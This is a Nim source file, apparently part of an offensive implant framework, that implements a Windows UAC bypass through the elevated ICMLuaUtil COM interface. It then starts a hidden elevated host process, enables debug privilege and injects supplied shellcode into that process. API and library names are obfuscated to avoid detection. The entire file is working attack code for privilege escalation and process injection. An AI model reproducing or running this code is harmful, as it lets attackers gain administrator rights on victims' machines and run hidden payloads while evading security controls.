from ../injection/core import injectPayload
import ../../utils/global
import ../../utils/general/strings
import ../../utils/winapi/handlers as winapi
import ../../utils/winapi/syscall
import ./utils

const
  coInitApartmentThreaded = 0x2'u32
  clsctxLocalServer = 0x4'u32
  swHide = 0'u32
  seeMaskFlagNoUi = 0x00004000'u32

type
  ComGuid = object
    data1: culong
    data2, data3: uint16
    data4: array[8, uint8]

  BindOpts3 = object
    cbStruct, grfFlags, grfMode, dwTickCountDeadline, dwTrackFlags,
      dwClassContext, locale: culong
    pServerInfo, hwnd: pointer

  TIcmluaShellExec = proc(
    self, lpFile, lpParameters, lpDirectory: pointer; fMask, nShow: culong
  ): culong {.stdcall.}

proc comFailed(hr: culong): bool =
  # Checks that a com result code means failure
  (hr and 0x80000000'u32) != 0

## COM UAC bypass (ICMLuaUtil) + remote shellcode inject into elevated host (--sacrifice).
proc runIcmluaUtilBypass*(payload: openArray[byte]; params: string): (bool,
    uint32, string) =
  # Runs the icmlua elevation bypass and injects the payload
  result = (false, 0'u32, "")
  if payload.len == 0:
    return
  let target = resolveSpawnPath(params)
  result[2] = target
  if target.len == 0 or not pathExists(target):
    return

  type
    TCoInitializeEx = proc(reserved: pointer; flags: culong): culong {.stdcall.}
    TCoUninitialize = proc() {.stdcall.}
    TCoGetObject = proc(
      pszName: pointer; pBindOpts: pointer; riid: pointer; ppv: ptr pointer
    ): culong {.stdcall.}
    TClsidFromString = proc(lpsz: pointer; pclsid: pointer): culong {.stdcall.}
    TIidFromString = proc(lpsz: pointer; piid: pointer): culong {.stdcall.}

  let ole32 = winapi.loadLibraryA(obf("ole32.dll"))
  if ole32 == nil:
    return
  let coInit = cast[TCoInitializeEx](winapi.getProcAddress(ole32, obf(
      "CoInitializeEx")))
  let coUninit = cast[TCoUninitialize](winapi.getProcAddress(ole32, obf(
      "CoUninitialize")))
  let coGetObject = cast[TCoGetObject](winapi.getProcAddress(ole32, obf(
      "CoGetObject")))
  let clsidFromString = cast[TClsidFromString](winapi.getProcAddress(ole32, obf(
      "CLSIDFromString")))
  let iidFromString = cast[TIidFromString](winapi.getProcAddress(ole32, obf(
      "IIDFromString")))
  if coInit == nil or coUninit == nil or coGetObject == nil or
      clsidFromString == nil or iidFromString == nil:
    return

  var hr = coInit(nil, coInitApartmentThreaded)
  if comFailed(hr) and hr != 0x80010106'u32:
    return

  var clsidStr = obf("{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
  var iidStr = obf("{6EDD6D74-C007-4E75-B76A-E5740995E24C}")
  var wClsid: array[64, uint16]
  var wIid: array[64, uint16]
  asciiWide(clsidStr, wClsid)
  asciiWide(iidStr, wIid)
  var clsid, iid: ComGuid
  if comFailed(clsidFromString(addr wClsid[0], addr clsid)):
    coUninit()
    return
  if comFailed(iidFromString(addr wIid[0], addr iid)):
    coUninit()
    return

  var moniker = obf("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
  var wMoniker: array[128, uint16]
  asciiWide(moniker, wMoniker)
  var bop: BindOpts3
  zeroMem(addr bop, sizeof(bop))
  bop.cbStruct = culong sizeof(BindOpts3)
  bop.dwClassContext = clsctxLocalServer

  var luaUtil: pointer = nil
  hr = coGetObject(addr wMoniker[0], addr bop, addr iid, addr luaUtil)
  if comFailed(hr) or luaUtil == nil:
    coUninit()
    return

  var wTarget: array[512, uint16]
  if target.len >= wTarget.len:
    let vtblEarly = cast[ptr UncheckedArray[pointer]](cast[ptr pointer](
        luaUtil)[])
    discard cast[proc(self: pointer): culong {.stdcall.}](vtblEarly[2])(luaUtil)
    coUninit()
    return
  asciiWide(target, wTarget)

  let vtbl = cast[ptr UncheckedArray[pointer]](cast[ptr pointer](luaUtil)[])
  let shellExec = cast[TIcmluaShellExec](vtbl[9])
  hr = shellExec(luaUtil, addr wTarget[0], nil, nil, seeMaskFlagNoUi, swHide)
  discard cast[proc(self: pointer): culong {.stdcall.}](vtbl[2])(luaUtil)
  coUninit()
  if comFailed(hr):
    return

  winapi.sleepMs(400)
  let exeName = processExeBaseName(target)
  let pid = findNewestProcessPidByName(exeName)
  if pid == 0:
    return

  discard enableSeDebugPrivilege()
  let procH = openProcess(culong(pid))
  if procH == nil:
    return
  defer:
    discard ntCloseHandle(procH)

  let hThread = injectPayload(procH, payload)
  if hThread == nil:
    return
  discard ntCloseHandle(hThread)
  result = (true, pid, target)
